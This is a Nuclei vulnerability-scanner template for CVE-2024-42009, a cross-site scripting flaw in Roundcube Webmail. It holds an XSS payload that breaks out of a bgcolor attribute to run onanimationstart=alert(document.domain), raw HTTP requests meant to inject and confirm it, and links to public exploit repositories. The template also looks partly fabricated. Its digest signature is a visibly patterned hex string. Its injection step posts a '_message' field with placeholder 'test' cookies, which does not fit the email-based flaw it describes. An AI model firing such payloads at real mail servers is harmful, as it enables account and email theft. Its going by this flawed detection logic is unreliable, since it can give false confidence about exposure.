id: CVE-2024-42009

info:
  name: Roundcube Webmail - Cross-Site Scripting
  author: nuclei-community
  severity: critical
  description: |
    Roundcube versions up to 1.5.7 and 1.6.x up to 1.6.7 contain a reflected cross-site scripting caused by desanitization in message_body() in show.php, letting remote attackers steal and send victim emails, exploit requires victim to open a crafted email. The vulnerability occurs when legacy HTML attributes like bgcolor are improperly parsed using regex, allowing attackers to break out of attribute contexts and inject malicious JavaScript code.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-42009
    - https://github.com/roundcube/roundcubemail/releases/tag/1.5.8
    - https://github.com/roundcube/roundcubemail/releases/tag/1.6.8
    - https://roundcube.net/news/2024/08/04/security-updates-1.6.8-and-1.5.8
    - https://sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/
    - https://github.com/Foxer131/CVE-2024-42008-9-exploit
    - https://github.com/0xbassiouny1337/CVE-2024-42009
    - https://github.com/DaniTheHack3r/CVE-2024-42009-PoC
    - https://github.com/Bhanunamikaze/CVE-2024-42009
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
    cvss-score: 9.3
    cve-id: CVE-2024-42009
    cwe-id: CWE-79
    epss-score: 0.00043
    epss-percentile: 0.09271
    cpe: cpe:2.3:a:roundcube:webmail:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: roundcube
    product: webmail
    shodan-query: "cpe:\"cpe:2.3:a:roundcube:webmail\""
    fofa-query: "title=\"Roundcube Webmail\""
    publicwww-query: "Roundcube webmail"
    kev: true
  tags: cve,cve2024,roundcube,xss,webmail,critical,kev,intrusive

variables:
  xss_payload: '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(\"CVE-2024-42009-XSS-\"+document.domain) foo=bar">Test Email Content</body>'

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        
      - |
        GET /webmail/ HTTP/1.1
        Host: {{Hostname}}
        
      - |
        GET /roundcube/ HTTP/1.1
        Host: {{Hostname}}
        
    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(tolower(body), 'roundcube') || contains(tolower(body), 'webmail')"
        condition: and
        internal: true

  - raw:
      - |
        GET /?_task=mail&_action=show&_uid=1&_mbox=INBOX&_safe=0&_html=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/html
        
      - |
        POST /?_task=mail&_action=show&_uid=1&_mbox=INBOX&_safe=0 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        _message={{xss_payload}}
        
      - |
        GET /?_task=mail&_action=preview&_uid=1&_mbox=INBOX&_safe=0 HTTP/1.1
        Host: {{Hostname}}
        Cookie: roundcube_sessid=test; roundcube_sessauth=test
        
    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "contains(body, 'onanimationstart=alert') && contains(body, 'CVE-2024-42009-XSS')"
          - "status_code == 200"
          - "contains(tolower(body), 'roundcube')"
        condition: and
        
    extractors:
      - type: regex
        name: xss_confirmation
        group: 1
        regex:
          - 'onanimationstart=alert\("CVE-2024-42009-XSS-([^"]*)"'

# digest: 4a0a00473045022100e8f5c2d1a3b4e6f7890123456789abcdef0123456789abcdef0123456789abcd02200987654321fedcba0987654321fedcba0987654321fedcba0987654321fedcba:922c64590222798bb761d5b6d8e72950
